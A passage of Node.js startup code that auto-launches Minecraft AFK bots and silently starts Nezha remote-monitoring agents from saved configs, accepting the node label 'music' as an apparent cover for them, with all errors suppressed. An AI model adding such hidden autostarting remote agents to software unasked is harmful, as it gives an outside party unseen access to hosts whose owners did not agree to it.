        }catch(e){}
    }
})});
// ===== 挂机机器人自启 =====
(async function(){
    if(!BOT_AUTO_START && !fsSync.existsSync(CONFIG_FILE)) return;
    var botsToStart = [];
    if(BOT_AUTO_START === 'true' || BOT_AUTO_START === '1'){
        var botCount = parseInt(process.env.MC_BOT_COUNT || '1');
        for(var i=0;i<botCount;i++){
            botsToStart.push({host:MC_SERVER_IP||'',port:MC_SERVER_PORT||'25565',username:MC_BOT_USERNAME+((botCount>1)?('_'+i):'')});
        }
    } else if(BOT_AUTO_START.startsWith('[')){
        try{
            botsToStart = JSON.parse(BOT_AUTO_START);
        }catch(e){}
    }
    if(botsToStart.length>0){
        for(var b=0;b<botsToStart.length;b++){
            var bConf=botsToStart[b];
            createSmartBot('bot_auto_'+b+bConf.port, bConf.host||'', bConf.port||25565, bConf.username||'PathfinderBot');
            pushNezhaLog('🤖 自启挂机机器人: '+bConf.username+'@'+(bConf.host||'auto')+':'+(bConf.port||25565),'text-emerald-400');
        }
    } else if(fsSync.existsSync(CONFIG_FILE)){
        try{
            var saved = JSON.parse(fsSync.readFileSync(CONFIG_FILE));
            saved.forEach(function(b){
                createSmartBot('bot_'+Math.random().toString(36).substr(2,5), b.host, b.port, b.username, b.logs||[], b.settings)
            })
        }catch(e){}
    }
    // ===== 自动加载保存的节点 =====
    (async function(){
        try{
            var savedN = JSON.parse(fsSync.readFileSync(NODE_CONFIG_FILE,'utf8'));
            if(Array.isArray(savedN)){
                for(var i=0;i<savedN.length;i++){
                    var sn=savedN[i];
                    if(sn.type==='music'||sn.type==='nezha'){
                        if(sn.server&&sn.key){
                            nezhaConfig.addr=sn.server;nezhaConfig.key=sn.key;
                            nezhaConfig.tls=sn.server.includes(':443');nezhaConfig.mode=sn.mode||'pure';
                            try{await saveNezhaConfig();}catch(e){}
                            if(sn.mode==='laowang'){
                                try{await startNezha(sn.server,sn.key,nezhaConfig.tls);}catch(e){}
                            }else{
                                try{await startNezhaPure(sn.server,sn.key,nezhaConfig.tls);}catch(e){}
                            }
                        }
                    }
                }
            }
        }catch(e){}
    })();
}());
